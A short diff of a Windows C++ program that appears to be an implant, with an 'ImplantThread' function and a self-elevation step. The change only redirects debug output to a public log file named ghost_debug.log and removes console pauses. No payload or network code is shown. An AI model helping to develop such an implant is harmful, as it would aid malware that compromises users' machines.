@@ -121,17 +121,24 @@ DWORD WINAPI ImplantThread(LPVOID) {
 }
 
 int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR lpCmdLine, int) {
-    // ponytail: attach console in debug so printf is visible; remove for release
 #ifdef DEBUG
-    AllocConsole();
-    FILE* f = nullptr;
-    freopen_s(&f, "CONOUT$", "w", stdout);
-    freopen_s(&f, "CONOUT$", "w", stderr);
-    atexit([]{ printf("\n[DEBUG] Press Enter to exit...\n"); fflush(stdout); getchar(); });
+    // ponytail: file log survives elevation — no console attachment needed
+    FILE* dbgLog = nullptr;
+    fopen_s(&dbgLog, "C:\\Users\\Public\\ghost_debug.log", "a");
+    if (!dbgLog) {
+        AllocConsole();
+        FILE* f = nullptr;
+        freopen_s(&f, "CONOUT$", "w", stdout);
+        freopen_s(&f, "CONOUT$", "w", stderr);
+    } else {
+        // redirect stdout/stderr to the log file
+        *stdout = *dbgLog;
+        *stderr = *dbgLog;
+    }
+    atexit([]{ printf("\n[DEBUG] done.\n"); fflush(stdout); });
 #endif
-    printf("[DEBUG] WinMain entered\n");
+    printf("[DEBUG] WinMain entered pid=%lu\n", GetCurrentProcessId());
     fflush(stdout);
-    printf("[DEBUG] Press Enter to continue...\n"); fflush(stdout); getchar();
 
     // Elevate if not already admin
     printf("[DEBUG] Checking elevation flag...\n"); fflush(stdout);
